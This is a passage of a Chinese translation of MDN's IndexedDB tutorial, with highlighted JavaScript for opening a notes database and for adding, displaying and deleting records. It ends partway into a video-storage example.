功能（如果我们不这么做，它会失败）。</p></li><li><p>在window.onload处理程序内，添加以下内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// Open our database; it is created if it doesn&#x27;t already exist</span><br><span class="hljs-comment">// (see onupgradeneeded below)</span><br><span class="hljs-keyword">let</span> request = <span class="hljs-variable language_">window</span>.<span class="hljs-property">indexedDB</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;notes&#x27;</span>, <span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>此行创建一个request变量，目的是打开note数据库的1</p><p>版本。如果notes数据库不存在，则后续代码将为您创建。您将在 IndexedDB 中经常看到此请求模式。数据库操作需要时间。您不希望在等待结果时挂起浏览器，因此数据库操作是异步的，这意味着它们不会立即发生，而是在将来的某个时刻发生，并且在完成后会收到通知。 要在 IndexedDB 中处理此问题，您需要创建一个请求对象（可以随意命名 - 命名为request，可以表明它的用途）。然后，在请求完成或者失败时，使用事件处理程序来运行代码，您将在下面看到这些代码。</p><p><strong>备注：</strong> 版本号很重要。如果要升级数据库（例如：更改表结构），则必须使用增加的版本号或者<code>onupgradeneeded</code>处理程序内指定的不同模式（请参阅下文）等再次运行代码。在这个简单教程中，我们不讨论数据库升级。</p><ol><li><p>在之前添加的事件处理程序下方添加以下代码 - 在window.onload处理程序内：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">// onerror handler signifies that the database didn&#x27;t open successfully</span><br>request.onerror = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&#x27;Database failed to open&#x27;</span>);<br>&#125;;<br><br><span class="hljs-comment">// onsuccess handler signifies that the database opened successfully</span><br>request.onsuccess = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&#x27;Database opened successfully&#x27;</span>);<br><br>  <span class="hljs-comment">// Store the opened database object in the db variable. This is used a lot below</span><br>  db = request.result;<br><br>  <span class="hljs-comment">// Run the displayData() function to display the notes already in the IDB</span><br>  displayData();<br>&#125;;<br></code></pre></td></tr></table></figure><p>如果系统返回：请求失败，<code>request.onerror</code> (en-US)将会运行。这将允许你对这个问题做出响应。在我们的简单示例中，只是将消息打印到 JavaScript 控制台。 如果系统返回：请求成功，表明成功打开数据库，<code>request.onsuccess</code> (en-US)将会运行。如果是这种情况，则表示已打开数据库的对象在<code>request.result</code> (en-US)属性中变为可用，从而允许我们操作数据库。我们将它存储在db吗，我们之前创建的变量中供以后使用。我们还运行一个名为displayData()的自定义函数，它把数据库中的数据显示在元素 ( 或 HTML 无序列表元素）代表多项的无序列表，即无数值排序项的集合，且它们在列表中的顺序是没有意义的。通常情况下，无序列表项的头部可以是几种形式，如一个点，一个圆形或方形。头部的风格并不是在页面的 HTML 描述定义，但在其相关的 CSS 可以用 list-style-type 属性。”&gt;<code>&lt;ul&gt;</code>。我们现在运行它，以便在页面加载时显示数据库中已有的注释。您将在稍后看到此定义。</p></li></ol></li><li><p>最后，对于本节，我们可能会添加最重要的事件处理程序来设置数据库：<code>request.onupgradeneeded</code> (en-US)。如果尚未设置数据库，或者使用比现有存储数据库更大的版本号打开数据库（执行升级时），则运行此处理程序。在上一个处理程序下面添加以下代码：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">// Setup the database tables if this has not already been done</span><br>request.onupgradeneeded = <span class="hljs-keyword">function</span>(e) &#123;<br>  <span class="hljs-comment">// Grab a reference to the opened database</span><br>  <span class="hljs-keyword">let</span> db = e.target.result;<br><br>  <span class="hljs-comment">// Create an objectStore to store our notes in (basically like a single table)</span><br>  <span class="hljs-comment">// including a auto-incrementing key</span><br>  <span class="hljs-keyword">let</span> objectStore = db.create<span class="hljs-constructor">ObjectStore(&#x27;<span class="hljs-params">notes</span>&#x27;, &#123; <span class="hljs-params">keyPath</span>: &#x27;<span class="hljs-params">id</span>&#x27;, <span class="hljs-params">autoIncrement</span>:<span class="hljs-params">true</span> &#125;)</span>;<br><br>  <span class="hljs-comment">// Define what data items the objectStore will contain</span><br>  objectStore.create<span class="hljs-constructor">Index(&#x27;<span class="hljs-params">title</span>&#x27;, &#x27;<span class="hljs-params">title</span>&#x27;, &#123; <span class="hljs-params">unique</span>: <span class="hljs-params">false</span> &#125;)</span>;<br>  objectStore.create<span class="hljs-constructor">Index(&#x27;<span class="hljs-params">body</span>&#x27;, &#x27;<span class="hljs-params">body</span>&#x27;, &#123; <span class="hljs-params">unique</span>: <span class="hljs-params">false</span> &#125;)</span>;<br><br>  console.log(&#x27;Database setup complete&#x27;);<br>&#125;;<br></code></pre></td></tr></table></figure><p>这是我们定义数据库的模式（结构）的地方; 也就是说，它包含的列（或字段）集。这里我们首先从e.target.result（事件目标的result属性）中获取对现有数据库的引用，该引用是request对象。这相当于处理程序db &#x3D; request.result;内部的行onsuccess，但我们需要在此单独执行此操作，因为onupgradeneeded处理程序（如果需要）将在onsuccess处理程序之前运行，这意味着db如果我们不这样做，该值将不可用。 然后<code>IDBDatabase.createObjectStore()</code>，我们使用在打开的数据库中创建一个新的对象库。这相当于传统数据库系统中的单个表。我们给它起了名称注释，并且还指定了一个autoIncrement名为的关键字段id在每个新记录中，这将自动赋予增量值 - 开发人员不需要明确地设置它。作为密钥，该id字段将用于唯一标识记录，例如删除或显示记录时。 我们还使用以下<code>IDBObjectStore.createIndex()</code> (en-US)方法创建另外两个索引（字段）:(title每个音符将包含一个标题），以及body（包含音符的正文）。</p></li></ol><p>因此，通过设置这个简单的数据库模式，当我们开始向数据库添加记录时，每个记录都会沿着这些行表示为一个对象：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">  title:</span> <span class="hljs-string">&quot;Buy milk&quot;</span>,<br><span class="hljs-symbol">  body:</span> <span class="hljs-string">&quot;Need both cows milk and soya.&quot;</span>,<br><span class="hljs-symbol">  id:</span> <span class="hljs-number">8</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h4 id="添加数据到数据库"><a href="#添加数据到数据库" class="headerlink" title="添加数据到数据库"></a>添加数据到数据库</h4><p>现在让我们看一下如何将记录添加到数据库中。这将使用我们页面上的表单完成。</p><p>在您之前的事件处理程序下面（但仍在<code>window.onload</code>处理程序中），添加以下行，该行设置一个<code>onsubmit</code>处理程序，该处理程序运行<code>addData()</code>在提交表单时调用的函数（当 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/button">元素表示一个可点击的按钮，可以用在表单或文档其它需要使用简单标准按钮的地方。”&gt;&#96;&#96;</a>按下提交时导致成功提交表单）：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">// <span class="hljs-keyword">Create</span> an onsubmit <span class="hljs-keyword">handler</span> so that <span class="hljs-keyword">when</span> the form <span class="hljs-keyword">is</span> submitted the addData() <span class="hljs-keyword">function</span> <span class="hljs-keyword">is</span> run<br>form.onsubmit = addData;<br></code></pre></td></tr></table></figure><p>现在让我们定义一下这个<code>addData()</code>功能。在上一行下面添加：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">// Define the addData() function</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addData</span>(<span class="hljs-params">e</span>) &#123;<br>  <span class="hljs-comment">// prevent default - we don&#x27;t want the form to submit in the conventional way</span><br>  e.preventDefault();<br><br>  <span class="hljs-comment">// grab the values entered into the form fields and store them in an object ready for being inserted into the DB</span><br>  let newItem = &#123; <span class="hljs-attr">title</span>: titleInput.value, <span class="hljs-attr">body</span>: bodyInput.value &#125;;<br><br>  <span class="hljs-comment">// open a read/write db transaction, ready for adding the data</span><br>  let transaction = db.transaction([<span class="hljs-string">&#x27;notes&#x27;</span>], <span class="hljs-string">&#x27;readwrite&#x27;</span>);<br><br>  <span class="hljs-comment">// call an object store that&#x27;s already been added to the database</span><br>  let objectStore = transaction.objectStore(<span class="hljs-string">&#x27;notes&#x27;</span>);<br><br>  <span class="hljs-comment">// Make a request to add our newItem object to the object store</span><br>  <span class="hljs-keyword">var</span> request = objectStore.add(newItem);<br>  request.onsuccess = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// Clear the form, ready for adding the next entry</span><br>    titleInput.value = <span class="hljs-string">&#x27;&#x27;</span>;<br>    bodyInput.value = <span class="hljs-string">&#x27;&#x27;</span>;<br>  &#125;;<br><br>  <span class="hljs-comment">// Report on the success of the transaction completing, when everything is done</span><br>  transaction.oncomplete = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&#x27;Transaction completed: database modification finished.&#x27;</span>);<br><br>    <span class="hljs-comment">// update the display of data to show the newly added item, by running displayData() again.</span><br>    displayData();<br>  &#125;;<br><br>  transaction.onerror = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&#x27;Transaction not opened due to error&#x27;</span>);<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>这很复杂; 打破它，我们：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Event/preventDefault"><code>Event.preventDefault()</code></a>在事件对象上运行以停止以传统方式实际提交的表单（这将导致页面刷新并破坏体验）。</li><li>创建一个表示要输入数据库的记录的对象，并使用表单输入中的值填充它。请注意，我们不必明确包含一个<code>id</code>值 - 正如我们提前详细说明的那样，这是自动填充的。</li><li>使用该方法打开对象存储的<code>readwrite</code>事务。此事务对象允许我们访问对象存储，以便我们可以对其执行某些操作，例如添加新记录。<code>notes</code><a href="https://developer.mozilla.org/en-US/docs/Web/API/IDBDatabase/transaction"><code>IDBDatabase.transaction()</code> (en-US)</a></li><li>使用该<a href="https://developer.mozilla.org/en-US/docs/Web/API/IDBTransaction/objectStore"><code>IDBTransaction.objectStore()</code> (en-US)</a>方法访问对象库，将结果保存在 <code>objectStore</code> 变量中。</li><li>使用添加新记录到数据库<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/IDBObjectStore/add"><code>IDBObjectStore.add()</code></a>。这创建了一个请求对象，与我们之前看到的方式相同。</li><li>在生命周期的关键点添加一堆事件处理程序<code>request</code>以及<code>transaction</code>运行代码。请求成功后，我们会清除表单输入，以便输入下一个注释。交易完成后，我们<code>displayData()</code>再次运行该功能以更新页面上的注释显示。</li></ul><h4 id="显示数据"><a href="#显示数据" class="headerlink" title="显示数据"></a>显示数据</h4><p>我们已经<code>displayData()</code>在代码中引用了两次，所以我们可能更好地定义它。将其添加到您的代码中，位于上一个函数定义之下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">// Define the displayData() function</span><br><span class="hljs-keyword">function</span> display<span class="hljs-constructor">Data()</span> &#123;<br>  <span class="hljs-comment">// Here we empty the contents of the list element each time the display is updated</span><br>  <span class="hljs-comment">// If you ddn&#x27;t do this, you&#x27;d get duplicates listed each time a new note is added</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-built_in">list</span>.firstChild) &#123;<br>    <span class="hljs-built_in">list</span>.remove<span class="hljs-constructor">Child(<span class="hljs-params">list</span>.<span class="hljs-params">firstChild</span>)</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// Open our object store and then get a cursor - which iterates through all the</span><br>  <span class="hljs-comment">// different data items in the store</span><br>  <span class="hljs-keyword">let</span> objectStore = db.transaction(&#x27;notes&#x27;).<span class="hljs-keyword">object</span><span class="hljs-constructor">Store(&#x27;<span class="hljs-params">notes</span>&#x27;)</span>;<br>  objectStore.<span class="hljs-keyword">open</span><span class="hljs-constructor">Cursor()</span>.onsuccess = <span class="hljs-keyword">function</span>(e) &#123;<br>    <span class="hljs-comment">// Get a reference to the cursor</span><br>    <span class="hljs-keyword">let</span> cursor = e.target.result;<br><br>    <span class="hljs-comment">// If there is still another data item to iterate through, keep running this code</span><br>    <span class="hljs-keyword">if</span>(cursor) &#123;<br>      <span class="hljs-comment">// Create a list item, h3, and p to put each data item inside when displaying it</span><br>      <span class="hljs-comment">// structure the HTML fragment, and append it inside the list</span><br>      <span class="hljs-keyword">let</span> listItem = document.create<span class="hljs-constructor">Element(&#x27;<span class="hljs-params">li</span>&#x27;)</span>;<br>      <span class="hljs-keyword">let</span> h3 = document.create<span class="hljs-constructor">Element(&#x27;<span class="hljs-params">h3</span>&#x27;)</span>;<br>      <span class="hljs-keyword">let</span> para = document.create<span class="hljs-constructor">Element(&#x27;<span class="hljs-params">p</span>&#x27;)</span>;<br><br>      listItem.append<span class="hljs-constructor">Child(<span class="hljs-params">h3</span>)</span>;<br>      listItem.append<span class="hljs-constructor">Child(<span class="hljs-params">para</span>)</span>;<br>      <span class="hljs-built_in">list</span>.append<span class="hljs-constructor">Child(<span class="hljs-params">listItem</span>)</span>;<br><br>      <span class="hljs-comment">// Put the data from the cursor inside the h3 and para</span><br>      h3.textContent = cursor.value.title;<br>      para.textContent = cursor.value.body;<br><br>      <span class="hljs-comment">// Store the ID of the data item inside an attribute on the listItem, so we know</span><br>      <span class="hljs-comment">// which item it corresponds to. This will be useful later when we want to delete items</span><br>      listItem.set<span class="hljs-constructor">Attribute(&#x27;<span class="hljs-params">data</span>-<span class="hljs-params">note</span>-<span class="hljs-params">id</span>&#x27;, <span class="hljs-params">cursor</span>.<span class="hljs-params">value</span>.<span class="hljs-params">id</span>)</span>;<br><br>      <span class="hljs-comment">// Create a button and place it inside each listItem</span><br>      <span class="hljs-keyword">let</span> deleteBtn = document.create<span class="hljs-constructor">Element(&#x27;<span class="hljs-params">button</span>&#x27;)</span>;<br>      listItem.append<span class="hljs-constructor">Child(<span class="hljs-params">deleteBtn</span>)</span>;<br>      deleteBtn.textContent = &#x27;Delete&#x27;;<br><br>      <span class="hljs-comment">// Set an event handler so that when the button is clicked, the deleteItem()</span><br>      <span class="hljs-comment">// function is run</span><br>      deleteBtn.onclick = deleteItem;<br><br>      <span class="hljs-comment">// Iterate to the next item in the cursor</span><br>      cursor.continue<span class="hljs-literal">()</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// Again, if list item is empty, display a &#x27;No notes stored&#x27; message</span><br>      <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">list</span>.firstChild) &#123;<br>        <span class="hljs-keyword">let</span> listItem = document.create<span class="hljs-constructor">Element(&#x27;<span class="hljs-params">li</span>&#x27;)</span>;<br>        listItem.textContent = &#x27;No notes stored.&#x27;<br>        <span class="hljs-built_in">list</span>.append<span class="hljs-constructor">Child(<span class="hljs-params">listItem</span>)</span>;<br>      &#125;<br>      <span class="hljs-comment">// if there are no more cursor items to iterate through, say so</span><br>      console.log(&#x27;Notes all displayed&#x27;);<br>    &#125;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>再次，让我们打破这个：</p><ul><li>首先，我们清空 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/ul"><code>ul</code></a> 元素的内容，然后填充更新的内容。如果您不这样做，那么每次更新时都会添加大量重复内容。</li><li>接下来，我们<code>notes</code>使用<a href="https://developer.mozilla.org/en-US/docs/Web/API/IDBDatabase/transaction"><code>IDBDatabase.transaction()</code> (en-US)</a>和<a href="https://developer.mozilla.org/en-US/docs/Web/API/IDBTransaction/objectStore"><code>IDBTransaction.objectStore()</code> (en-US)</a>我们一样得到对象存储的引用<code>addData()</code>，除了这里我们将它们链接在一行中。</li><li>下一步是使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/IDBObjectStore/openCursor"><code>IDBObjectStore.openCursor()</code></a>方法打开对游标的请求 - 这是一个可用于迭代对象存储中的记录的构造。我们将一个<code>onsuccess</code>处理程序链接到该行的末尾以使代码更简洁 - 当成功返回游标时，运行处理程序。</li><li>我们<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/IDBCursor"><code>IDBCursor</code></a>使用 let 获取对游标本身（对象）的引用<code>cursor = e.target.result</code>。</li><li>接下来，我们检查光标是否包含来自数据存储区（<code>if(cursor)&#123; ... &#125;</code>）的记录 - 如果是这样，我们创建一个 DOM 片段，用记录中的数据填充它，然后将其插入页面（<code>&lt;ul&gt;</code>元素内部）。我们还包括一个删除按钮，当单击该按钮时，将通过运行该<code>deleteItem()</code>功能删除该注释，我们将在下一节中查看。</li><li>在<code>if</code>块结束时，我们使用该<a href="https://developer.mozilla.org/en-US/docs/Web/API/IDBCursor/continue"><code>IDBCursor.continue()</code> (en-US)</a>方法将光标前进到数据存储区中的下一条记录，然后<code>if</code>再次运行块的内容。如果有另一个要迭代的记录，这会导致它被插入到页面中，然后<code>continue()</code>再次运行，依此类推。</li><li>当没有更多记录要迭代时，<code>cursor</code>将返回<code>undefined</code>，因此<code>else</code>块将运行而不是<code>if</code>块。此块检查是否有任何注释被插入<code>&lt;ul&gt;</code>- 如果没有，它会插入一条消息，说没有存储注释。</li></ul><h4 id="删除一条笔记"><a href="#删除一条笔记" class="headerlink" title="删除一条笔记"></a>删除一条笔记</h4><p>如上所述，当按下笔记的删除按钮时，笔记将被删除。这是通过<code>deleteItem()</code>函数实现的，如下所示：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">// Define the deleteItem() function</span><br><span class="hljs-keyword">function</span> delete<span class="hljs-constructor">Item(<span class="hljs-params">e</span>)</span> &#123;<br>  <span class="hljs-comment">// retrieve the name of the task we want to delete. We need</span><br>  <span class="hljs-comment">// to convert it to a number before trying it use it with IDB; IDB key</span><br>  <span class="hljs-comment">// values are type-sensitive.</span><br>  <span class="hljs-keyword">let</span> noteId = <span class="hljs-constructor">Number(<span class="hljs-params">e</span>.<span class="hljs-params">target</span>.<span class="hljs-params">parentNode</span>.<span class="hljs-params">getAttribute</span>(&#x27;<span class="hljs-params">data</span>-<span class="hljs-params">note</span>-<span class="hljs-params">id</span>&#x27;)</span>);<br><br>  <span class="hljs-comment">// open a database transaction and delete the task, finding it using the id we retrieved above</span><br>  <span class="hljs-keyword">let</span> transaction = db.transaction(<span class="hljs-literal">[&#x27;<span class="hljs-identifier">notes</span>&#x27;]</span>, &#x27;readwrite&#x27;);<br>  <span class="hljs-keyword">let</span> objectStore = transaction.<span class="hljs-keyword">object</span><span class="hljs-constructor">Store(&#x27;<span class="hljs-params">notes</span>&#x27;)</span>;<br>  <span class="hljs-keyword">let</span> request = objectStore.delete(noteId);<br><br>  <span class="hljs-comment">// report that the data item has been deleted</span><br>  transaction.oncomplete = <span class="hljs-keyword">function</span><span class="hljs-literal">()</span> &#123;<br>    <span class="hljs-comment">// delete the parent of the button</span><br>    <span class="hljs-comment">// which is the list item, so it is no longer displayed</span><br>    e.target.parentNode.parentNode.remove<span class="hljs-constructor">Child(<span class="hljs-params">e</span>.<span class="hljs-params">target</span>.<span class="hljs-params">parentNode</span>)</span>;<br>    console.log(&#x27;Note &#x27; + noteId + &#x27; deleted.&#x27;);<br><br>    <span class="hljs-comment">// Again, if list item is empty, display a &#x27;No notes stored&#x27; message</span><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">list</span>.firstChild) &#123;<br>      <span class="hljs-keyword">let</span> listItem = document.create<span class="hljs-constructor">Element(&#x27;<span class="hljs-params">li</span>&#x27;)</span>;<br>      listItem.textContent = &#x27;No notes stored.&#x27;;<br>      <span class="hljs-built_in">list</span>.append<span class="hljs-constructor">Child(<span class="hljs-params">listItem</span>)</span>;<br>    &#125;<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>第一部分可以使用一些解释 - 我们检索要删除<code>Number(e.target.parentNode.getAttribute(&#39;data-note-id&#39;))</code>的记录的 ID - 回想一下记录的 ID 是在第一次显示时保存在<code>data-note-id</code>属性中的<code>&lt;li&gt;</code>。但是，我们需要通过全局内置的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Number">Number（）</a>对象传递属性，因为它当前是一个字符串，否则将无法被数据库识别。</li><li>然后，我们使用我们之前看到的相同模式获取对对象存储的引用，并使用该<a href="https://developer.mozilla.org/en-US/docs/Web/API/IDBObjectStore/delete"><code>IDBObjectStore.delete()</code> (en-US)</a>方法从数据库中删除记录，并将 ID 传递给它。</li><li>当数据库事务完成后，我们<code>&lt;li&gt;</code>从 DOM 中删除注释，然后再次检查以查看它是否<code>&lt;ul&gt;</code>为空，并根据需要插入注释。</li></ul><p>就是这样了！你的例子现在应该有效。</p><p>如果您遇到问题，请随时<a href="https://mdn.github.io/learning-area/javascript/apis/client-side-storage/indexeddb/notes/">查看我们的实例</a>（请参阅<a href="https://github.com/mdn/learning-area/blob/master/javascript/apis/client-side-storage/indexeddb/notes/index.js">源代码</a>）。</p><h4 id="通过-IndexedDB-存储复杂数据"><a href="#通过-IndexedDB-存储复杂数据" class="headerlink" title="通过 IndexedDB 存储复杂数据"></a>通过 IndexedDB 存储复杂数据</h4><p>如上所述，IndexedDB 可用于存储不仅仅是简单的文本字符串。您可以存储任何您想要的东西，包括复杂的对象，如视频或图像 blob。并且它比任何其他类型的数据更难实现。</p><p>为了演示如何操作，我们编写了另一个名为<a href="https://github.com/mdn/learning-area/tree/master/javascript/apis/client-side-storage/indexeddb/video-store">IndexedDB 视频存储的</a>示例（请参阅<a href="https://mdn.github.io/learning-area/javascript/apis/client-side-storage/indexeddb/video-store/">此处也可以在此处运行</a>）。首次运行示例时，它会从网络下载所有视频，将它们存储在 IndexedDB 数据库中，然后在 UI 内部 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/video">&#96;&#96;</a> 元素中显示视频。第二次运行它时，它会在数据库中找到视频并从那里获取它们而不是显示它们 - 这使得后续加载更快，占用空间更少。</p><p>让我们来看看这个例子中最有趣的部分。我们不会全部看 - 它的很多内容与上一个示例类似，代码注释得很好。</p><ol><li><p>对于这个简单的例子，我们已经存储了视频的名称以获取数组 opf 对象：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">const videos</span> = [<br>  &#123; <span class="hljs-string">&#x27;name&#x27;</span> : <span class="hljs-string">&#x27;crystal&#x27;</span> &#125;,<br>  &#123; <span class="hljs-string">&#x27;name&#x27;</span> : <span class="hljs-string">&#x27;elf&#x27;</span> &#125;,<br>  &#123; <span class="hljs-string">&#x27;name&#x27;</span> : <span class="hljs-string">&#x27;frog&#x27;</span> &#125;,<br>  &#123; <span class="hljs-string">&#x27;name&#x27;</span> : <span class="hljs-string">&#x27;monster&#x27;</span> &#125;,<br>  &#123; <span class="hljs-string">&#x27;name&#x27;</span> : <span class="hljs-string">&#x27;pig&#x27;</span> &#125;,<br>  &#123; <span class="hljs-string">&#x27;name&#x27;</span> : <span class="hljs-string">&#x27;rabbit&#x27;</span> &#125;<br>];<br></code></pre></td></tr></table></figure></li><li><p>首先，一旦数据库成功打开，我们就运行一个init()函数。这会遍历不同的视频名称，尝试加载由videos数据库中的每个名称标识的记录。 如果在数据库中找到每个视频（通过查看request.result评估是否容易检查true- 如果记录不存在，那么undefined），视频文件（存储为 blob）和视频名称将直接传递给displayVideo()函数以放置它们在用户界面中。如果没有，视频名称将传递给fetchVideoFromNetwork()函数…你猜对了 - 从网络中获取视频。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> init<span class="hljs-literal">()</span> &#123;<br>  <span class="hljs-comment">// Loop through the video names one by one</span><br>  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; videos.length; i++) &#123;<br>    <span class="hljs-comment">// Open transaction, get object store, and get() each video by name</span><br>    <span class="hljs-keyword">let</span> objectStore = db.transaction(&#x27;videos&#x27;).<span class="hljs-keyword">object</span><span class="hljs-constructor">Store(&#x27;<span class="hljs-params">videos</span>&#x27;)</span>;<br>    <span class="hljs-keyword">let</span> request = objectStore.get(videos<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>.name);<br>    request.onsuccess = <span class="hljs-keyword">function</span><span class="hljs-literal">()</span> &#123;<br>      <span class="hljs-comment">// If the result exists in the database (is not undefined)</span><br>      <span class="hljs-keyword">if</span>(request.result) &#123;<br>        <span class="hljs-comment">// Grab the videos from IDB and display them using displayVideo()</span><br>        console.log(&#x27;taking videos from IDB&#x27;);<br>        display<span class="hljs-constructor">Video(<span class="hljs-params">request</span>.<span class="hljs-params">result</span>.<span class="hljs-params">mp4</span>, <span class="hljs-params">request</span>.<span class="hljs-params">result</span>.<span class="hljs-params">webm</span>, <span class="hljs-params">request</span>.<span class="hljs-params">result</span>.<span class="hljs-params">name</span>)</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Fetch the videos from the network</span><br>        fetch<span class="hljs-constructor">VideoFromNetwork(<span class="hljs-params">videos</span>[<span class="hljs-params">i</span>])</span>;<br>      &#125;<br>    &#125;;<br>  